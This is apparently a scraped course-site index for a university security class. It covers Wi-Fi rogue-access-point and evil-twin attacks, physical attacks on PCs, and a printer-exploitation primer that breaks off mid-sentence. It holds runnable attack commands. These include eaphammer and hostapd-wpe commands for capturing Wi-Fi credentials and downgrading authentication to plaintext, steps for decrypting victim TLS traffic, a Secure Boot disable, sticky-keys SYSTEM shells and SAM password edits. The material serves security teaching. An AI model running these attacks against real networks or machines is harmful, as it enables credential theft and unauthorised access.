Theory","text":""},{"location":"CS315/2021/Week%207/#network-selection-and-roaming","title":"Network Selection and Roaming","text":"<p>Although the 802.11 protocol has very specific rules that dictate how a station can join an ESS, it does not specify how the station should select an ESS to connect to. Additionally, the protocol allows stations to roam freely between access points that share the same ESSID (because you wouldn\u2019t want to lose WiFi connectivity when walking from one end of a building to another, etc). However, the 802.11 protocol does not specify how these access points should be selected. Furthermore, even though stations must be authenticated to the ESS in order to associate with an access point, the 802.11 protocol does not require the access point be authenticated to the station.</p>"},{"location":"CS315/2021/Week%207/#preferred-network-lists-pnls","title":"Preferred Network Lists (PNLs)","text":"<p>Each time a station connects to a wireless network, the network\u2019s ESSID is stored in the station\u2019s Preferred Network List (PNL). The PNL is an ordered list of every network that the station has connected to in the past, and each entry in the PNL contains the network\u2019s ESSID and any network-specific configuration information needed to establish a connection.</p>"},{"location":"CS315/2021/Week%207/#passive-scanning","title":"Passive Scanning","text":"<p>In infrastructure networks, access points periodically transmit beacon frames to advertise their presence and capabilities to nearby stations. Beacons are broadcast frames, which means they are intended to be received by all nearby stations in range. Beacons include information about the AP\u2019s supported rates, encryption capabilities, additional information, and most importantly, beacon frames contain the AP\u2019s ESSID (as long as ESSID broadcasting is not disabled).</p> <p>During passive scanning, the client device listens for beacon frames from nearby access points. If the client device receives a beacon frame whose ESSID field matches an ESSID from the client\u2019s PNL, the client will automatically connect to the access point that sent the beacon frame. Then, suppose we want to target a wireless device that is not currently connected to any wireless. If we know at least one entry in that client\u2019s PNL, we can force the client to connect to us simply by creating our own access point with that entry\u2019s ESSID.</p>"},{"location":"CS315/2021/Week%207/#active-probing","title":"Active Probing","text":"<p>The second network selection algorithm used in 802.11 is known as Active Probing. Client devices that use active probing continuously transmit probe request frames to determine what APs are within range, as well as what their capabilities are. Probe requests come in two forms: directed and broadcast. Directed probe requests are addressed to a specific ESSID, and are the client\u2019s way of checking if a specific network is nearby.</p> <p>Clients that use directed probing will send out probe requests for each network in its PNL. It should be noted that directed probing is the only way of identify the presence of nearby hidden networks. Broadcast probe requests work almost exactly the same way, but are sent with the SSID field set to NULL. This addresses the broadcast probe to all nearby access points, allowing the the station to check if any of its preferred networks are nearby without revealing the contents of its PNL</p>"},{"location":"CS315/2021/Week%207/#simple-ap-with-redirection-to-internet","title":"Simple AP with redirection to Internet","text":"<p>Before explaining how to perform more complex attacks it's going to be explained how to just create an AP and redirect it's traffic to an interface connected to the Internet.</p> <p>Using <code>ifconfig -a</code> check that the wlan interface to create the AP and the interface connected to the Internet are present.</p>"},{"location":"CS315/2021/Week%207/#dhcp-dns","title":"DHCP &amp; DNS","text":"<pre><code>apt-get install dnsmasq #Manages DHCP and DNS\n</code></pre> <p>create a config file /etc/dnsmasq.conf as follows:</p> <pre><code>interface=wlan0\ndhcp-authoritative\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\n</code></pre> <p>Then set IPs and routes:</p> <pre><code>ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0\nroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1\n</code></pre> <p>And then start dnsmasq:</p> <pre><code>dnsmasq -C dnsmasq.conf -d\n</code></pre>"},{"location":"CS315/2021/Week%207/#hostapd","title":"hostapd","text":"<pre><code>apt-get install hostapd\n</code></pre> <p>Create a config file hostapd.conf:</p> <pre><code>interface=wlan0\ndriver=nl80211\nssid=MITIWIFI\nhw_mode=g\nchannel=11\nmacaddr_acl=0\nignore_broadcast_ssid=0\nauth_algs=1\nwpa=2\nwpa_passphrase=mitmwifi123\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nwpa_group_rekey=86400\nieee80211n=1\nwme_enabled=1\n</code></pre> <p>Stop annoying processes , set monitor mode, and start hostapd:</p> <pre><code>airmon-ng check kill\niwconfig wlan0 mode monitor\nifconfig wlan0 up\nhostapd ./hostapd.conf\n</code></pre>"},{"location":"CS315/2021/Week%207/#forwarding-and-redirection","title":"Forwarding and Redirection","text":"<pre><code>iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE\niptables --append FORWARD --in-interface wlan0 -j ACCEPT\necho 1 &gt; /proc/sys/net/ipv4/ip_forward\n</code></pre>"},{"location":"CS315/2021/Week%207/#evil-twin","title":"Evil Twin","text":"<p>An evil twin attack is a type Wi-Fi attack that works by taking advantage of the fact that most computers and phones will only see the \"name\" or ESSID of a wireless network (as the base station is not required to authenticate against the client). This actually makes it very hard to distinguish between networks with the same name and same kind of encryption. In fact, many networks will have several network-extending access points all using the same name to expand access without confusing users.</p> <p>Due how the implementation of clients work (remember that the 802.11 protocol allows stations to roam freely between access points within the same ESS), it is possible to make a device to change the base station it is connected to. It is possible to do that offering a better signal (which is not always possible) or by blocking the access to the original base station (deauthentication packets, jamming, or some other form of DoS attack).</p> <p>Notice also that real-world wireless deployments usually have more than a single access point, and these access points are often more powerful and have better line-of-site range due to their placement towards the ceiling. Deauthenticating a single access point usually results in the target roaming towards another valid access point rather than your rogue AP, unless all nearby access points are deauthenticated (loud) or you are very careful with the placement of the rogue AP (difficult).</p> <p>You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:</p> <pre><code>airbase-ng -a 00:09:5B:6F:64:1E --essid \"Elroy\" -c 1 wlan0mon\n</code></pre> <p>You could also create an Evil Twin using eaphammer (notice that to create evil twins with eaphammer the interface should NOT be in monitor mode):</p> <pre><code>./eaphammer -i wlan0 --essid exampleCorp --captive-portal\n</code></pre> <p>Or using Airgeddon: <code>Options: 5,6,7,8,9 (inside Evil Twin attack menu).</code></p> <p></p> <p>Please, notice that by default if an ESSID in the PNL is saved as WPA protected, the device won't connect automatically to an Open evil Twin. You can try to DoS the real AP and hope that the user will connect manually to your Open evil twin, or you could DoS the real AP an use a WPA Evil Twin to capture the handshake (using this method you won't be able to let the victim connect to you as you don't know the PSK, but you can capture the handshake and try to crack it).</p> <p>Some OS and AV will warn the user that connect to an Open network is dangerous...</p>"},{"location":"CS315/2021/Week%207/#wpawpa2-evil-twin","title":"WPA/WPA2 Evil Twin","text":"<p>You can create an Evil Twin using WPA/2 and if the devices have configured to connect to that SSID with WPA/2, they are going to try to connect. Anyway, to complete the 4-way-handshake you also need to know the password that the client is going to use. If you don't know it, the connection won't be completed.</p> <pre><code>./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase \"mywifipassword\"\n</code></pre>"},{"location":"CS315/2021/Week%207/#enterprise-evil-twin","title":"Enterprise Evil Twin","text":"<p>To understand this attacks I would recommend to read before the brief WPA Enterprise explanation.</p>"},{"location":"CS315/2021/Week%207/#using-hostapd-wpe","title":"Using hostapd-wpe","text":"<p><code>hostapd-wpe</code> needs a configuration file to work. To automate the generation if these configurations you could use https://github.com/WJDigby/apd_launchpad (download the python file inside /etc/hostapd-wpe/)</p> <pre><code>./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com\nhostapd-wpe ./victim/victim.conf -s\n</code></pre> <p>In the configuration file you can select a lot of different things like ssid, channel, user files, cret/key, dh parameters, wpa version and auth...</p> <p>Using hostapd-wpe with EAP-TLS to allow any certificate to login.</p>"},{"location":"CS315/2021/Week%207/#using-eaphammer","title":"Using EAPHammer","text":"<pre><code># Generate Certificates./eaphammer --cert-wizard\n# Launch Attack./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds\n</code></pre> <p>By default, EAPHammer purposes this authentication methods (notice GTC as the first one to try to obtain plaintext passwords and then the use of more robust auth methods):</p> <pre><code>GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5\n</code></pre> <p>This is the default methodology to avoid long connection times. However, you can also specify to server the authentication methods from weakest to strongest:</p> <pre><code>--negotiate weakest\n</code></pre> <p>Or you could also use:</p> <ul> <li><code>--negotiate gtc-downgrade</code> to use highly efficient GTC downgrade implementation (plaintext passwords)</li> <li><code>--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP</code> to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).</li> <li>Find more info in the wiki</li> </ul>"},{"location":"CS315/2021/Week%207/#using-airgeddon","title":"Using Airgeddon","text":"<p><code>Airgeddon</code>can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to capture the user and the MD5 of the password. Later, the attacker can try to crack the password. <code>Airggedon</code>offers you the possibility of a continuous Evil Twin attack (noisy) or only create the Evil Attack until someone connects (smooth).</p> <p></p>"},{"location":"CS315/2021/Week%207/#debugging-peap-and-eap-ttls-tls-tunnels-in-evil-twins-attacks","title":"Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks","text":"<p>This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS</p> <p>Inside the configuration of hostapd-wpe comment the line that contains dh_file** (from <code>dh_file=/etc/hostapd-wpe/certs/dh</code> to <code>#dh_file=/etc/hostapd-wpe/certs/dh</code>) This will make <code>hostapd-wpe</code> to exchange keys using RSA instead of DH, so you will be able to decrypt the traffic later knowing the servers private key**.</p> <p>Now start the Evil Twin using <code>hostapd-wpe</code> with that modified configuration as usual. Also, start <code>wireshark</code>in the interface which is performing the Evil Twin attack.</p> <p>Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: <code>Edit --&gt; Preferences --&gt; Protocols --&gt; TLS --&gt; (RSA keys list) Edit...</code></p> <p>Add a new entry and fill the form with this values: IP address = any -- Port = 0 -- Protocol = data -- Key File (select your key file, to avoid problems select a key file without being password protected).</p> <p></p> <p>And look at the new \"Decrypted TLS\" tab:</p> <p></p>"},{"location":"CS315/2021/Week%207/#karma-mana-loud-mana-and-known-beacons-attack","title":"KARMA, MANA, Loud MANA and Known beacons attack","text":""},{"location":"CS315/2021/Week%207/#essid-and-mac-blackwhitelists","title":"ESSID and MAC black/whitelists","text":"<p>The following table lists the different type of MFACLs (Management Frame Access Control Lists) available, as well their effects when used:</p> <p></p> <pre><code># example EAPHammer MFACL file, wildcards can be used78:f0:97:fc:b5:369a:35:e1:01:4f:cf69:19:14:60:20:45ce:52:b8:*:*:*\n[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting][--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]\n</code></pre> <pre><code># example ESSID-based MFACL fileapplesorangesgrapespears\n[--ssid-whitelist /path/to/mac/whitelist/file.txt][--ssid-blacklist /path/to/mac/blacklist/file.txt]\n</code></pre>"},{"location":"CS315/2021/Week%207/#karma","title":"KARMA","text":"<p>Karma attacks are a second form of rogue access point attack that exploits the network selection process used by stations. In a whitepaper written in 2005, Dino Dai Zovi and Shane Macaulay describe how an attacker can configure an access point to listen for directed probe requests and respond to all of them with matching directed probe responses. This causes the affected stations to automatically send an association request to the attacker\u2019s access point. The access point then replies with an association response, causing the affected stations to connect to the attacker.</p>"},{"location":"CS315/2021/Week%207/#mana","title":"MANA","text":"<p>According to Ian de Villiers and Dominic White, modern stations are designed to protect themselves against karma attacks by ignoring directed probe responses from access points that have not already responded to at least one broadcast probe request. This led to a significant drop in the number of stations that were vulnerable to karma attacks until 2015, when White and de Villiers developed a means of circumventing such protections. In White\u2019s and de Villiers\u2019 improved karma attack (MANA attack), directed probe responses are used to reconstruct the PNLs of nearby stations. When a broadcast probe request is received from a station, the attacker\u2019s access point responds with an arbitrary SSID from the station\u2019s PNL already being saw in a direct probe from that device.</p> <p>In resume, the MANA algorithm works like this: each time the access point receives a probe request, it first determines whether it\u2019s a broadcast or directed probe. If it\u2019s directed probe, the sender\u2019s MAC address is added to the hash table (if it\u2019s not there already) and the ESSID is added to that device\u2019s PNL. The AP then responds with a directed probe response. If it\u2019s a broadcast probe, the access point responds with probe responses for each of the networks in that device\u2019s PNL.</p> <p>MANA attack using eaphammer:</p> <pre><code>./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]\n</code></pre>"},{"location":"CS315/2021/Week%207/#loud-mana","title":"Loud MANA","text":"<p>Notice that the standard MANA attack still does not allow us to attack devices that don\u2019t use directed probing at all. So if we also doesn't know previously any entry inside the device PNL, we need to figure out some other way to attack it.</p> <p>A possibility is what is called Loud MANA attack. This attack relies on the idea that client devices within close physical proximity to one another are likely to have at least some common entries in their PNLs.</p> <p>In resume, Loud MANA attack instead of responding to probe requests with each ESSID in a particular device\u2019s PNL, the rogue AP sends probe responses for every ESSID in every PNL across all devices that it has seen before. Relating this to set theory, we can say that the AP sends probe responses for each ESSID in the union of all PNLs of nearby devices.</p> <pre><code>./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]\n</code></pre>"},{"location":"CS315/2021/Week%207/#known-beacon-attack","title":"Known Beacon attack","text":"<p>There are still cases in which Loud MANA attack won\u2019t succeed. The Known Beacon attack is a way to \"Brute-Force\" ESSIDs to try to get the victim connect to the attacker. The attacker creates an AP that response to any ESSID and run some code sending beacons faking ESSIDs of each name inside a wordlist. Hopefully the victim will contains some of theses ESSID names inside its PNL and will try to connect to the fake AP. Eaphammer implemented this attack as a  MANA attack where all the ESSIDs inside a list are charged (you could also combine this with <code>--loud</code> to create a Loud MANA + Known beacons attack):</p> <pre><code>./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]\n</code></pre>"},{"location":"CS315/2021/Week%207/#known-beacon-burst-attack","title":"Known Beacon Burst attack","text":"<p>As known beacons are loud. You can use a script inside Eaphammer project to just launch beacouns of every ESSID name inside a file very quickly. If you combines this script with a Eaphammer MANA attack, the clients will be able to connect to your AP.</p> <pre><code># transmit a burst of 5 forged beacon packets for each entry in list\n./forge-beacons -i wlan1 \\\n --bssid de:ad:be:ef:13:37 \\\n --known-essids-file known-s.txt \\\n --dst-addr 11:22:33:11:22:33 \\\n --burst-count 5\n</code></pre>"},{"location":"CS315/2021/Week%207/#other-tools","title":"Other tools","text":""},{"location":"CS315/2021/Week%207/#wifite2","title":"Wifite2","text":"<p>This tool automates WPS/WEP/WPA-PSK attacks. It will automatically:</p> <ul> <li>Set the interface in monitor mode</li> <li>Scan for possible networks - And let you select the victim(s)</li> <li>If WEP - Launch WEP attacks</li> <li>If WPA-PSK</li> <li>If WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs.</li> <li>Try to capture the PMKID from the AP to crack it</li> <li>Try to deauthenticate clients of the AP to capture a handshake</li> <li>If PMKID or Handshake, try to bruteforce using top5000 passwords.</li> </ul>"},{"location":"CS315/2021/Week%207/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%207/#4-pt-insecure-wpa","title":"(4 pt) Insecure WPA","text":"<p>WiFi standards update so quick.</p> <p>Some security problems, some new attack ideas, balabala...</p> <p>I just don't want to update my router. Seriously, who would hack my wireless network?</p> <p><code>flag format: flag{md5 of the WiFi password}</code></p> <p>capture.cap</p>"},{"location":"CS315/2021/Week%207/#4-pt-s-traffic-sniff","title":"(4 pt) \u91ce\u7363\u5148\u8f29\uff08\u3084\u3058\u3085\u3046\u305b\u3093\u3071\u3044\uff09's traffic sniff","text":"<p>My \u305b\u3093\u3071\u3044 (seniority) invited me to play games in his house.</p> <p>The seniority treated me with delicious black tea. But his WiFi is too slow to play video games. So, I'm going to debug this wireless network.</p> <p>114514.7z</p>"},{"location":"CS315/2021/Week%207/#2-pt-wifi","title":"(2 pt) wifi","text":"<p>Wang uploaded a Godzilla Trojan to server upload-labs. The memory image, wifi traffic, and the server's traffic are saved.</p> <p>Wang used Trojan to run <code>cat /flag</code>, and you are given these files. Find the flag.</p> <p>chall.zip</p>"},{"location":"CS315/2021/Week%208/","title":"Week8 MISC: Physical Attacks","text":"<p>According to @Hacktricks: https://book.hacktricks.xyz/</p>"},{"location":"CS315/2021/Week%208/#bios-password","title":"BIOS password","text":""},{"location":"CS315/2021/Week%208/#the-battery","title":"The battery","text":"<p>Most of the motherbords have a battery. If you remove it 30min the settings of the BIOS will be restarted (password included).</p>"},{"location":"CS315/2021/Week%208/#jumper-cmos","title":"Jumper CMOS","text":"<p>Most of the motherboards have a jumper that can restart the settings. This jumper connects a central pin with another, if you connect thoses pins the motherbord will be reseted.</p>"},{"location":"CS315/2021/Week%208/#live-tools","title":"Live Tools","text":"<p>If you could run for example a Kali Linux from a Live CD/USB you could use tools like killCmos** or CmosPWD* (this last one is included in Kali) you could try to recover the password of the BIOS*.</p>"},{"location":"CS315/2021/Week%208/#online-bios-password-recovery","title":"Online BIOS password recovery","text":"<p>Put the password of the BIOS 3 times wrong, then the BIOS will show an error message and it will be blocked. Visit the page https://bios-pw.org and introduce the error code shown by the BIOS and you could be lucky and get a valid password (the same search could show you different passwords and more than 1 could be valid).</p>"},{"location":"CS315/2021/Week%208/#uefi","title":"UEFI","text":"<p>To check the settings of the UEFI and perform some kind of attack you should try chipsec. Using this tool you could easily disable the Secure Boot:</p> <pre><code>python chipsec_main.py -module exploits.secure.boot.pk\n</code></pre>"},{"location":"CS315/2021/Week%208/#ram","title":"RAM","text":""},{"location":"CS315/2021/Week%208/#cold-boot","title":"Cold boot","text":"<p>The RAM memory is persistent from 1 to 2 minutes from the time the computer is powered off. If you apply cold (liquid nitrogen, for example) on the memory card you can extend this time up to 10 minutes.</p> <p>Then, you can do a memory dump (using tools like dd.exe, mdd.exe, Memoryze, win32dd.exe or DumpIt) to analyze the memory.</p> <p>You should analyze the memory using volatility.</p>"},{"location":"CS315/2021/Week%208/#inception","title":"INCEPTION","text":"<p>Inception is a physical memory manipulation and hacking tool exploiting PCI-based DMA. The tool can attack over FireWire, Thunderbolt, ExpressCard, PC Card and any other PCI/PCIe HW interfaces. Connect your computer to the victim computer over one of those interfaces and INCEPTION will try to patch the pyshical memory to give you access.</p> <p>If INCEPTION succeeds, any password introduced will be vaid.</p> <p>It doesn't work with Windows10.</p>"},{"location":"CS315/2021/Week%208/#live-cdusb","title":"Live CD/USB","text":""},{"location":"CS315/2021/Week%208/#sticky-keys-and-more","title":"Sticky Keys and more","text":"<ul> <li>SETHC: sethc.exe is invoked when SHIFT is pressed 5 times</li> <li>UTILMAN: Utilman.exe is invoked by pressing WINDOWS+U</li> <li>OSK: osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard</li> <li>DISP: DisplaySwitch.exe is invoked by pressing WINDOWS+P</li> </ul> <p>These binaries are located inside C:\\Windows\\System32**. You can change any of them for a copy of the binary cmd.exe (also in the same folder) and any time that you invoke any of those binaries a command prompt as SYSTEM** will appear.</p>"},{"location":"CS315/2021/Week%208/#modifying-sam","title":"Modifying SAM","text":"<p>You can use the tool chntpw** to modify the SAM* file* of a mounted Windows filesystem. Then, you could change the password of the Administrator user, for example. This tool is available in KALI.</p> <pre><code>chntpw -h\nchntpw -l &lt;path_to_SAM&gt;\n</code></pre> <p>Inside a Linux system you could modify the /etc/shadow** or /etc/passwd* file.*</p>"},{"location":"CS315/2021/Week%208/#kon-boot","title":"Kon-Boot","text":"<p>Kon-Boot is one of the best tools around which can log you into Windows without knowing the password. It works by hooking into the system BIOS and temporarily changing the contents of the Windows kernel while booting (new versions work also with UEFI). It then allows you to enter anything as the password during login. The next time you start the computer without Kon-Boot, the original password will be back, the temporary changes will be discarded and the system will behave as if nothing has happened. Read More: https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/</p> <p>It is a live CD/USB that can patch the memory so you won't need to know the password to login. Kon-Boot also performs the StickyKeys trick so you could press Shift** 5 times to get an Administrator cmd**.</p>"},{"location":"CS315/2021/Week%208/#running-windows","title":"Running Windows","text":""},{"location":"CS315/2021/Week%208/#initial-shortcuts","title":"Initial shortcuts","text":""},{"location":"CS315/2021/Week%208/#booting-shortcuts","title":"Booting shortcuts","text":"<ul> <li>supr - BIOS</li> <li>f8 - Recovery mode</li> <li>supr - BIOS ini</li> <li>f8 - Recovery mode</li> <li>Shitf (after the windows banner) - Go to login page instead of autologon (avoid autologon)</li> </ul>"},{"location":"CS315/2021/Week%208/#bad-usbs","title":"BAD USBs","text":""},{"location":"CS315/2021/Week%208/#rubber-ducky-tutorials","title":"Rubber Ducky tutorials","text":"<ul> <li>Tutorial 1</li> <li>Tutorial 2</li> </ul>"},{"location":"CS315/2021/Week%208/#teensyduino","title":"Teensyduino","text":"<ul> <li>Payloads and tutorials</li> </ul> <p>There are also tons of tutorials about how to create your own bad USB.</p>"},{"location":"CS315/2021/Week%208/#volume-shadow-copy","title":"Volume Shadow Copy","text":"<p>With administrators privileges and powershell you could make a copy of the SAM file. See this code.</p>"},{"location":"CS315/2021/Week%208/#bypassing-bitlocker","title":"Bypassing Bitlocker","text":"<p>Bitlocker uses 2 passwords. The one used by the user, and the recovery password (48 digits).</p> <p>If you are lucky and inside the current session of Windows exists the file C:\\Windows\\MEMORY.DMP** (It is a memory dump) you could try to search inside of it the recovery password. You can get this file and a copy of the filesytem and then use Elcomsoft Forensic Disk Dercyptor to get the content (this will only work if the password is inside the memory dump). You coud also force the memory dump* using NotMyFault* of Sysinternals, but this will reboot the system and has to be executed as Administrator.</p> <p>You could also try a bruteforce attack using *Passware Kit Forensic*.</p>"},{"location":"CS315/2021/Week%208/#an-introduction-to-printer-exploitation","title":"An Introduction to Printer Exploitation","text":""},{"location":"CS315/2021/Week%208/#preface","title":"Preface","text":"<p>Note: As always the following is just a digest of all the things I could observe by working on printers myself or facts from stuff I read about recently.</p> <p>Since this thread about the HP printer promo videos 3 caught some attention I will try to shed some light onto the field which was displayed there. First of all we should keep in mind this was a promo video made by a company. So always ask yourself this: \u201cHow real are the displayed scenarios, or are these just \u2018Hollywood fabrications\u2019?\u201d</p> <p>I had some access to different printers over the last couple of month and learned some basic principles, which I wanna share with you as good as possible now. Printer use a various amount of protocols and firmwares which differ from vendor to vendor and model to model. So this first part might be boring to some, you can try to skip the theoretical part and jump right to the exploitation paragraph, but talking about fundamentals will cover important topics.</p>"},{"location":"CS315/2021/Week%208/#printer-as-an-attack-vector","title":"Printer as an attack vector?","text":"<ul> <li>So why would I even want to target a printer in the first place?</li> <li>Why not just target Desktop or Server environments with malware as usual?</li> </ul> <p>We get to that in next couple of paragraphs</p>"},{"location":"CS315/2021/Week%208/#required-skills","title":"Required Skills","text":"<p>Not much to mention here</p> <ul> <li>basic ability to read for more than 5 minutes</li> </ul>"},{"location":"CS315/2021/Week%208/#printer-a-viable-target-or-just-wasted-time","title":"Printer a viable target or just wasted time?","text":""},{"location":"CS315/2021/Week%208/#local-vs-network-printers","title":"Local vs Network printers","text":"<p>Local printers are just directly connected to a desktop PC and are rather uninteresting. These days almost all printers seem to be network printers though. So basically network printing enables users in locations geographically separate from each other and from their print devices to produce documents for themselves and others. Print servers enable multiple clients to share one or more print devices. So far so easy right? Let\u2019s jump directly to some highlevel view which explains every network printer quite well.</p>"},{"location":"CS315/2021/Week%208/#highlevel-view","title":"Highlevel view","text":"<p>A highlevel view of current network printers might look something like this:</p> <pre><code>  +----------------------------------------------------+\n                       | Network printing protocols    |\n   Printing channel    +-------------------------------+--+\n                       |                                  |\n                       | IPP, LPD, SMB, raw port 9100     |\n                       |                                  |\n  +--------------------------------------------------+    |\n                       | job/printer control langs.  |    |\n   Printer language    +-----------------------------+--+ |\n                       |                                | |\n                       |  PJL, PML                      | |\n                       |                                | |\n                       | +------------------------+     | |\n                       | | Page descr. langs.     |     | |\n                       | +------------------------+---+ | |\n                       | |                            | | |\n                       | | PS, PCL, PDF, XPS, ...     | | |\n                       | |                            | | |\n                       | +----------------------------+ | |\n                       +--------------------------------+ |\n                       +----------------------------------+\n</code></pre> <p>Note: This diagram might be incomplete!</p> <p>=The network printing protocol acts as a channel to deploy print jobs, which either contain the page description language directly or first invoke a printer/job control language!</p> <p>Let\u2019s take a look at each of those sections in the diagram above more closely and cover some fundamentals.</p>"},{"location":"CS315/2021/Week%208/#fundamentals","title":"Fundamentals","text":""},{"location":"CS315/2021/Week%208/#firmware","title":"Firmware","text":"<p>Printer use, in my experience a couple of different operating systems for embedded devices. I\u2019ll list a few of them here, but won\u2019t really dive into them, since it would go beyond the scope of this article.</p> <ul> <li>Basic but slimmed down GNU/Linux, often custom tailored,</li> <li>WindRiver Linux 54,</li> <li>VxWorks 38,</li> <li>ThreadX 28.</li> </ul> <p>With the different, but limited pool of printers I\u2019ve had access to all of them had some things in common in the end.</p> <ul> <li>slimmed down instruction/command set - reduced functionality,</li> <li>\u2018legacy kernels\u2019 - often around kernel version 2.6.XYZ,</li> <li>might include \u2018hidden\u2019 functionality, which can be enabled through a little patch - e.g.: ssh files are there, but need to be enabled in config files,</li> <li>ssh is more present in printers designed for offices, compared to home printers for some reason,</li> <li>sometimes the way the firmware is stored is hilarious - e.g.: on a SD card you can remove/switch within 30 seconds of physical access</li> </ul> <p>These facts show that printers might be vulnerable to certain attacks, but still these attacks often are made more \u2018complicated\u2019, because certain functions aren\u2019t even there or somehow have to get enabled through (remote) file system writes\u2026</p> <p>Next a wild bunch of protocols is used for communication between Printers, print servers, desktop PCs and even internally within a printer. Let\u2019s take a look!</p>"},{"location":"CS315/2021/Week%208/#network-printing-protocols","title":"Network printing protocols","text":"<p>To summarize it right away there are a bunch of \u2018exotic\u2019 protocols for network printing (NCP or AppleTalk for example) To explain and mention them all here would be too much again. If anyone is interested in some specifics or a follow up post I\u2019d answer any questions there.</p> <p>In the Windows world, SMB/CIFS printer are popular. The most common printing protocols supported directly by network printers however are LPD, IPP, and raw port 9100 printing, which I will explain a bit more in depth now. Furthermore, some devices support printing over generic protocols such as FTP or HTTP file uploads as well.</p>"},{"location":"CS315/2021/Week%208/#lpd","title":"LPD","text":"<p>LPD is short for \u2018Line Printer Daemon\u2019-protocol. It runs on port 515/TCP and can be accessed by using \u2018lpr\u2019 over the CLI. To print things, the client sends a control file defining job/username and a data file containing the actual data to be printed.</p>"},{"location":"CS315/2021/Week%208/#ipp","title":"IPP","text":"<p>IPP is an extendable protocol and based on HTTP, so it inherits all existing security features like basic authentication and SSL/TLS encryption. To submit a print job, a HTTP POST request is sent to the IPP server, which listens on 631/TCP. For anyone wondering CUPS is an IPP implementation, which is a default printing system in many Linux distributions and macOS X.</p>"},{"location":"CS315/2021/Week%208/#smb","title":"SMB","text":"<p>SMB, short for \u2018Server Message Block\u2019 is an application-layer network protocol, which handles file and printer sharing. It\u2019s used by default on Windows. Usually it runs on 445/TCP.</p>"},{"location":"CS315/2021/Week%208/#port-9100","title":"Port 9100","text":"<p>Also known as \u2018raw printing\u2019, since it makes use of connecting to 9100/TCP of a network printer. It is the default method used by CUPS and the Windows printing architecture. Here all data sent is directly processed by the printing device, just like a parallel connection over TCP. In contrast to LPD, IPP and SMB interpreted printer control/page description languages, this one here is capable of sending direct feedback to the client, including status and error messages. So we have a bidirectional channel here, which directly can give us access to results of the Printer control languages!</p>"},{"location":"CS315/2021/Week%208/#printer-control-languages","title":"Printer Control Languages","text":"<p>Basically a job control language manages settings like output trays for the current job. It often just sits in between the printing protocol and the page description language. Printer control and management languages are designed to affect not only a single print job but the device as a whole. I\u2019m not too knowledgeable here but the two most basic ones are listed below.</p>"},{"location":"CS315/2021/Week%208/#snmp","title":"SNMP","text":"<p>SNMP, short for \u2018Simple Network Management Protocol\u2019 listens on 161/UDP. Was designed to manage network components</p>"},{"location":"CS315/2021/Week%208/#pjl","title":"PJL","text":"<p>PJL, short for \u2018Printer Job Language\u2019 is the kinda de-facto standard now Can be used to manipulate general settings, also with permanent changes. There are many dialects as vendors tend to support only a subset of the commands listed in the PJL reference and instead prefer to add proprietary ones. PJL is also used to set the file format of the actual print data to follow, which makes it interesting for various attacks.</p>"},{"location":"CS315/2021/Week%208/#page-description-languages-pdl","title":"Page Description Languages (PDL)","text":"<p>This one basically specifies how the actual document will look like appearance wise. Here comes the printer driver into play which kinda translate the file to be printed into a PDL that is understood by the printer.</p>"},{"location":"CS315/2021/Week%208/#postscript-ps","title":"PostScript (PS)","text":"<p>Is well known and made by Adobe and is widely used as a PDL. PS is capable of far more than just defining the appearance of the document and handling vector graphics though. That\u2019s why, when used correctly, PS can be used for a variety of attacks such as denial of service (for example, through infinite loops), print job manipulation and retention as well as gaining access to the printer\u2019s file system.</p>"},{"location":"CS315/2021/Week%208/#pcl","title":"PCL","text":"<p>As a minimalist page description language supported by a wide variety of vendors and devices. Is also a de-facto Standard nowadays. It\u2019s also not intended to get direct access to the underlying filesystem. So it\u2019s not that well suited for exploitation purposes, but still has it\u2019s place for such purposes as well.</p>"},{"location":"CS315/2021/Week%208/#possible-exploits","title":"Possible Exploits","text":""},{"location":"CS315/2021/Week%208/#who-would-put-a-printer-on-the-internet","title":"Who would put a printer on the Internet?","text":"<p>I just leave this data as a first expression here</p> <p>shodan count port:9100 pjl 29111 [7/07/20 7:42:13] dev@ops shodan count port:515 lpd 50607 [7/07/20 7:42:46] dev@ops shodan count port:631 ipp 90760 [7/07/20 7:43:10] dev@ops shodan count port:161 snmp 7876</p> <p>Data from: 07.07.2020</p>"},{"location":"CS315/2021/Week%208/#attack-vectors","title":"Attack Vectors","text":""},{"location":"CS315/2021/Week%208/#remote","title":"Remote","text":"<p>As easily seen above a lot of printers are connected to the Internet through port 9100, which make them attackable. You either know the IP or can just scan for some in your neighborhood radius/ check shodan. Once you have some you might get a SSH connection going. Often standard login credentials are still used, which you can easily scrape from the 